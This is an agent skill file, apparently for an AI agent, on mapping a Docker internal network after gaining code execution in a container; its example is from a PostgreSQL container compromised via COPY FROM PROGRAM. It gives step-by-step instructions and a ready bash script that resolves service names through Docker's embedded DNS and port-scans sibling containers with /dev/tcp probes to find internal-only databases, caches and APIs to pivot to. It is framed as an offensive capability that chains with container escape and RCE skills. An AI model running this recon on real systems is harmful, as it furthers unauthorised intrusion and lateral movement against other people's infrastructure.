---
name: docker-internal-network-recon
description: Map a Docker internal network's topology from inside an RCE'd container using DNS enumeration + nc/bash port scanning (no nmap needed). Use when you land code execution in a container and want to discover sibling services on the Docker bridge/compose network - resolve service names via the embedded DNS, sweep the /24 with bash TCP, and identify databases, caches, and admin panels reachable laterally. Pairs with [[container-escape-assessment]] and [[postgresql-copy-rce]].
---

## When to use
When you have RCE inside a Docker container and need to discover other containers on the internal network (172.17.0.0/16 or 172.20.0.0/16) to identify pivot targets and internal-only services (not exposed on host).

## How
1. From RCE shell, use Docker's embedded DNS at `127.0.0.11:53` (standard in docker-compose networks)
2. Enumerate service names from environment variables, docker-compose files, or guessing standard names (`web_server`, `relational_db`, `redis`, `cache`, etc.)
3. Resolve each name via `nslookup <service> 127.0.0.11` or `getent hosts <service>` → get internal IPs
4. Port-scan resolved IPs using `nc -w1 -z <IP> <port>` (timeout 1s per connection, busybox-compatible) or bash `/dev/tcp/IP/port` probe
5. Build mapping: container IP → open ports → likely services (3000=web, 5432=postgres, 8081=api, 19071=config, etc.)
6. Identify services unreachable from outside host (only visible internally)

## Example
From PostgreSQL container RCE (via COPY FROM PROGRAM):
```bash
# DNS resolution of Onyx service names
echo "=== docker DNS resolution ==="
for h in relational_db index cache redis vespa web_server nginx background api_server; do
  result=$(nslookup $h 127.0.0.11 2>&1 | grep 'Address:' | tail -1 | awk '{print $2}')
  [ -n "$result" ] && echo "$h: $result"
done

# Port scan of discovered containers
echo "=== internal container port scan ==="
for t in 172.20.0.1 172.20.0.2 172.20.0.4 172.20.0.5 172.20.0.7; do
  for p in 80 443 3000 5432 6379 8080 8081 19071 19092 9000; do
    (echo >/dev/tcp/$t/$p && echo "$t:$p OPEN") 2>/dev/null || true
  done
done
```

Output reveals internal-only services like Vespa messagebus (19092), web_server Next.js API (3000) accessible only from within Docker network.
